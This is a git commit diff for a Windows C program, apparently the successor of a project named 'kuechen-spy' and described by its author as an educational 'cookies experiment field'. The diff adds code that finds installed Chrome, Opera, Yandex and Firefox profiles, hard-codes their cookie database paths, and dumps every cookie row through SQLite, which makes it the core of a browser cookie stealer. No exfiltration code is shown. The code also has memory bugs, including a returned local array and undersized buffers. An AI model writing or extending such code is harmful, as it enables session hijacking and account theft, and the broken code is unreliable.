e3dfc185f7ed70324027ee446e73d23bcbdb3fac
Vulpes Vulpes <50295222+vulpes-solis@users.noreply.github.com>
2021-05-04 17:17:47 +0300

    This is something mentally dangerous. SEGFLT btw.

--- src/main.c
+++ src/main.c
@@ -1,11 +1,9 @@
 /*
 @
-    - Вecided to rewrite everything,
-      because the previous version was awful
-      and also some unnecessary things were used.
-    - cpp previous version: 
-        github.com/vulpes-solis/kuechen-spy
-@
+    - Browser's cookies experiment field.
+    - Was written just in education pourpose.
+    ^ I personally don't like the previous version.
+@ 
 */
 
 #include "main.h"
@@ -13,7 +11,7 @@
 #include <stdio.h>
 #include <string.h>
 #include <dirent.h>
-// #include <sqlite3.h>
+#include <sqlite3.h>
 #include <windows.h>
 
 #ifndef CH_TYPE
@@ -26,6 +24,11 @@
 #endif
 
 
+/* Global cookie datatype array offset for callback 
+*/
+uint32_t offset = 0;
+
+
 int main(void)
 {
     char  username[50];
@@ -35,7 +38,9 @@ int main(void)
         return -1;
 
     uint16_t user_path_size = strlen("C:\\Users\\\\");
-    char user_path[username_size + strlen(username)];
+    char     user_path[username_size + strlen(username)];
+
+    /* Set local user path. */
     sprintf(user_path, "C:\\Users\\%s\\", username);
 
     uint16_t local_path_s, roaming_path_s;
@@ -45,35 +50,28 @@ int main(void)
     char roaming_path[roaming_path_s];
     char local_path[local_path_s];
 
+    /* Get and set roaming and local pathes. */
     sprintf(roaming_path, "%sAppData\\Roaming\\", user_path);
     sprintf(local_path, "%sAppData\\Local\\", user_path);
 
-    printf("%s\n", user_path);
-    printf("%s\n", roaming_path);
-    printf("%s\n", local_path);
- 
-    char* main_dir[100];
-    char path[strlen("C:\\Users\\\\Desktop\\") + strlen(username)];
 
-    sprintf(path, "C:\\Users\\%s\\Desktop\\", username);
-    dir_reader(path, main_dir);
+    /* Here we'll check what browsers are installed already. */
+    browser_prediction local_machine;
+    local_machine = check_browsers(local_path, roaming_path);
+    local_machine.user_path = user_path;
 
-    /* 
-        For some reason here I do have the SEGFAULT.
-        It's because main_dir[i] still exist for some weird shit.
-        Need to fix. Obviously need to fix...
-    */
-    printf("%s\n", check_file_in_dir("archive",
-            "C:\\Users\\hanka\\Desktop\\") ? "Yes" : "No");
+    /* Output status for test pourpose. */
+    printf("FF: %d\nCH: %d\nOP: %d\nYA: %d\n", 
+        local_machine.FF, local_machine.CH,
+        local_machine.OP, local_machine.YA);
 
-    return 0;
+    struct cookies_datatype* local_container = collect_data(local_machine);
 
-    /* Just in test purpouse. */
-    cookies_datatype container;
-
-    container.host   = "host";
-    container.value  = "value";
-    container.b_type = FF_TYPE;
+    /* for (int i = 0; i < offset; i++)
+        printf("host: %s\nvalue: %s\n", 
+            local_container[i].host,
+            local_container[i].value);
+            */
 
     return 0;
 }
@@ -88,12 +86,14 @@ void dir_reader(const char* directory, char** files)
 
     if ((dir = opendir(directory)) != NULL)
     {
-        for (int i = 0; (entry = readdir(dir)) != NULL; i++)
+        int i = 0;
+        for (; (entry = readdir(dir)) != NULL; i++)
         {
             files[i] = (char *)malloc(sizeof(entry->d_name));
             strcpy(files[i], entry->d_name);
         }
         closedir(dir);
+        files[i] = NULL;
     }
     else
         files[0] = NULL;
@@ -121,3 +121,98 @@ uint8_t check_file_in_dir(char* filename, const char* dir)
     return 0;
 }
 
+
+/* Will check an avaible browsers on this local machine.
+   Type browser_prediction defined in 'main.h'.
+*/
+browser_prediction check_browsers(char* local, char* roaming)
+{
+    browser_prediction status;
+    status.FF = check_file_in_dir("Mozilla", roaming);
+    status.CH = check_file_in_dir("Google", local);
+    status.OP = check_file_in_dir("Opera Software", roaming);
+    status.YA = check_file_in_dir("Yandex", local);
+
+    return status;
+}
+
+
+/* Collect SQL data from databases of browser's cookies.
+*/
+struct cookies_datatype* collect_data(browser_prediction status)
+{
+    struct cookies_datatype local_container[256];
+    char* u_path = status.user_path;
+    char* full_path = malloc(sizeof(u_path) + sizeof(YA_PATH) + 1);
+
+    //if (status.FF)
+        //get_sql(&local_container, FF_PATH, FF_TYPE);
+
+    if (status.CH)
+    {
+        sprintf(full_path, "%s%s", u_path, CH_PATH);
+        get_sql(local_container, full_path, CH_TYPE);
+    }
+
+    if (status.OP)
+    {
+        sprintf(full_path, "%s%s", u_path, OP_PATH);
+        get_sql(local_container, full_path, CH_TYPE);
+    }
+
+    if (status.YA)
+    {
+        sprintf(full_path, "%s%s", u_path, YA_PATH);
+        get_sql(local_container, full_path, CH_TYPE);
+    }
+
+    free(full_path);
+
+    return local_container;
+}
+
+
+/* Callback function for SQL request to the database.
+*/
+static int callback(struct cookies_datatype* cont, int argc, char **argv, char **colname)
+{
+    if (offset >= 256) return 0;
+    int i = 0;
+    for (; i < argc; i++)
+    {
+        cont[i+offset].value  = argv[i] ? argv[i] : "NULL";
+        cont[i+offset].host   = colname[i];
+        cont[i+offset].b_type = 1; 
+
+        printf("%s\n", cont[i+offset].host);
+    }
+    offset += i;
+
+    return 0;
+}
+
+
+/* Will get data from SQL database and 'll put it in container.
+*/
+void get_sql(struct cookies_datatype* cont, const char* sql_path, uint8_t bt)
+{
+    sqlite3* database;
+    char* err = 0;
+    int s_code;
+    const char request[30];
+
+    s_code = sqlite3_open(sql_path, &database);
+
+    if (bt == CH_TYPE) {
+        strcpy(request, "SELECT * from cookies");
+    } 
+    else if (bt == FF_TYPE) {
+        strcpy(request, "SELECT * from moz_cookies");
+    } 
+    else {
+        return;
+    }
+
+    s_code = sqlite3_exec(database, request, callback, cont, &err);
+    sqlite3_close(database);
+}
--- src/main.h
+++ src/main.h
@@ -1,3 +1,19 @@
+#ifndef CH_PATH
+ #define CH_PATH "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies"
+#endif
+
+#ifndef YA_PATH
+ #define YA_PATH "AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\Cookies"
+#endif
+
+#ifndef OP_PATH
+ #define OP_PATH "AppData\\Roaming\\Opera Software\\Opera Stable\\Cookies"
+#endif
+
+#ifndef FF_PATH
+ #define FF_PATH "AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\"
+#endif
+
 
 #ifndef uint8_t
 typedef unsigned char
@@ -6,27 +22,42 @@ uint8_t;
 #endif
 
 #ifndef uint16_t
-typedef unsigned int
+typedef unsigned short
 uint16_t;
 
 #endif
-#ifndef cookies_datatype
 
-typedef struct
-    {
-        char*   host;
-        char*   value;
-        uint8_t b_type;
-    }
-cookies_datatype;
+#ifndef uint32_t
+typedef unsigned int
+uint32_t;
 
 #endif
 
-#ifndef c_container
-typedef cookies_datatype* 
-c_container;
+#ifndef cookies_datatype
+
+struct cookies_datatype {
+        char*   host;
+        char*   value;
+        uint8_t b_type;
+};
+
+#endif
+
+#ifndef browser_prediction
+
+typedef struct {
+        char*   user_path;
+        uint8_t FF;
+        uint8_t CH;
+        uint8_t OP;
+        uint8_t YA;
+    } 
+browser_prediction;
 
 #endif
 
 void dir_reader(const char* directory, char** files);
 uint8_t check_file_in_dir(char* filename, const char* dir);
+browser_prediction check_browsers(char* local, char* roaming);
+struct cookies_datatype* collect_data(browser_prediction status);
+void get_sql(struct cookies_datatype* cont, const char* sql_path, uint8_t bt);
